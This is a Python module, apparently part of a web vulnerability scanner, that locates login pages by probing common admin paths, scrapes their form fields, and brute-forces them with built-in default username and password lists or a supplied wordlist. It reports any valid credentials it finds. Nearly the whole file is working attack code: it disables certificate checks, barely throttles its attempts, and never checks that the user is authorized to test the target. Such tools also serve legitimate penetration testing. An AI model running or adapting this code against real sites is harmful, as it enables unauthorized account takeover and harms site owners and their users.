"""Login Brute Force Module — test credentials against real login forms."""

import aiohttp
import asyncio
import re
from urllib.parse import urlparse, urljoin
from modules.core import console


DEFAULT_USERNAMES = [
    'admin', 'administrator', 'root', 'user', 'test', 'guest', 'webmaster',
    'info', 'support', 'manager', 'operator', 'staff', 'demo', 'sysadmin',
    'devops', 'developer', 'deploy', 'api', 'service', 'backup',
]

DEFAULT_PASSWORDS = [
    'admin', 'password', '123456', '12345678', 'admin123', 'root',
    'toor', 'pass', 'test', 'guest', 'master', 'admin@123',
    'password123', 'Password1', 'admin1234', 'welcome', 'welcome1',
    'qwerty', 'letmein', 'abc123', 'monkey', 'dragon', 'login',
    'P@ssw0rd', 'Admin@123', 'Password@1', 'changeme', 'default',
    'admin!@#', 'Passw0rd!', 'Test@123', '123456789', 'iloveyou',
    'princess', 'football', 'shadow', 'sunshine', 'trustno1',
]

COMMON_LOGIN_PATHS = [
    '/login', '/admin/login', '/wp-login.php', '/administrator/',
    '/admin/', '/user/login', '/auth/login', '/signin', '/auth',
    '/account/login', '/panel/login', '/portal/login',
]


async def find_login_page(session, url):
    """Find login page by checking common paths."""
    for path in COMMON_LOGIN_PATHS:
        try:
            test_url = urljoin(url, path)
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=8),
                                   ssl=False, allow_redirects=True) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    body_lower = body.lower()
                    if any(indicator in body_lower for indicator in
                           ['type="password"', "type='password'", 'name="password"',
                            'name="pass"', 'name="passwd"', 'login', 'sign in']):
                        return {'url': test_url, 'body': body, 'status': resp.status}
        except Exception:
            pass
    return None


def extract_form_data(html, url):
    """Extract form action, method, and field names from HTML."""
    forms = []

    password_fields = re.findall(r'name=["\']([^"\']*(?:pass|pwd|password)[^"\']*)["\']', html, re.I)
    username_fields = re.findall(r'name=["\']([^"\']*(?:user|email|login|name|account)[^"\']*)["\']', html, re.I)

    if not password_fields:
        password_fields = ['password']
    if not username_fields:
        username_fields = ['username']

    form_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
    action = form_match.group(1) if form_match else url
    if not action.startswith('http'):
        action = urljoin(url, action)

    method_match = re.search(r'<form[^>]*method=["\']([^"\']*)["\']', html, re.I)
    method = method_match.group(1).upper() if method_match else 'POST'

    hidden_fields = {}
    for match in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.I):
        tag = match.group()
        name_match = re.search(r'name=["\']([^"\']+)["\']', tag)
        value_match = re.search(r'value=["\']([^"\']*)["\']', tag)
        if name_match:
            hidden_fields[name_match.group(1)] = value_match.group(1) if value_match else ''

    return {
        'action': action,
        'method': method,
        'username_field': username_fields[0],
        'password_field': password_fields[0],
        'hidden_fields': hidden_fields,
    }


async def try_login(session, form_data, username, password, login_body_length):
    """Attempt a single login with given credentials."""
    data = dict(form_data['hidden_fields'])
    data[form_data['username_field']] = username
    data[form_data['password_field']] = password

    try:
        if form_data['method'] == 'POST':
            async with session.post(form_data['action'], data=data,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                    ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                body_lower = body.lower()

                success = (
                    resp.status in [301, 302, 303] or
                    (resp.status == 200 and len(body) != login_body_length and
                     not any(err in body_lower for err in
                             ['invalid', 'incorrect', 'failed', 'error', 'wrong',
                              'denied', 'bad credentials', 'try again']))
                )

                return {
                    'username': username,
                    'password': password,
                    'status': resp.status,
                    'success': success,
                    'redirect': resp.headers.get('Location', ''),
                    'length': len(body),
                }
        else:
            return {'username': username, 'password': password, 'success': False, 'status': 0}
    except Exception:
        return {'username': username, 'password': password, 'success': False, 'status': 0}


async def scan_brute_force(session, url, wordlist_path=None):
    """Run login brute force against target."""
    console.print(f"\n[bold cyan]--- Login Brute Force ---[/bold cyan]")
    console.print(f"  [cyan]Finding login page...[/cyan]")
    login_page = await find_login_page(session, url)

    if not login_page:
        console.print(f"  [yellow]No login page found[/yellow]")
        return {'found': False, 'credentials': []}

    console.print(f"  [green]Login page: {login_page['url']}[/green]")

    form_data = extract_form_data(login_page['body'], login_page['url'])
    console.print(f"  [dim]Action: {form_data['action']}[/dim]")
    console.print(f"  [dim]User field: {form_data['username_field']}[/dim]")
    console.print(f"  [dim]Pass field: {form_data['password_field']}[/dim]")
    if form_data['hidden_fields']:
        console.print(f"  [dim]Hidden fields: {', '.join(form_data['hidden_fields'].keys())}[/dim]")

    usernames = list(DEFAULT_USERNAMES)
    passwords = list(DEFAULT_PASSWORDS)

    if wordlist_path:
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                custom_passwords = [line.strip() for line in f if line.strip()]
                passwords = custom_passwords[:500]
                console.print(f"  [green]Loaded {len(passwords)} passwords from {wordlist_path}[/green]")
        except Exception as e:
            console.print(f"  [yellow]Wordlist error: {e}[/yellow]")

    total = len(usernames) * len(passwords)
    console.print(f"  [cyan]Testing {len(usernames)} users × {len(passwords)} passwords = {total} combos[/cyan]\n")

    login_body_length = len(login_page['body'])
    results = {'found': True, 'credentials': [], 'login_url': login_page['url'], 'total_tested': 0}

    from rich.progress import Progress, BarColumn, TextColumn
    with Progress(
        TextColumn("[bold cyan]Brute Force"),
        BarColumn(bar_width=30),
        TextColumn("{task.completed}/{task.total}"),
        TextColumn("| Found: {task.fields[found]}"),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("Testing...", total=total, found=0)

        for username in usernames:
            for password in passwords:
                result = await try_login(session, form_data, username, password, login_body_length)
                results['total_tested'] += 1
                progress.update(task, advance=1)

                if result['success']:
                    results['credentials'].append(result)
                    progress.update(task, found=len(results['credentials']))
                    progress.console.print(
                        f"  [bold red]✓ VALID: {username}:{password} "
                        f"(Status: {result['status']}, Redirect: {result['redirect'][:40]})[/bold red]"
                    )

                await asyncio.sleep(0.1)

    if results['credentials']:
        console.print(f"\n  [bold red]⚠ {len(results['credentials'])} valid credentials found![/bold red]")
    else:
        console.print(f"\n  [green]✓ No weak credentials found ({results['total_tested']} tested)[/green]")

    return results
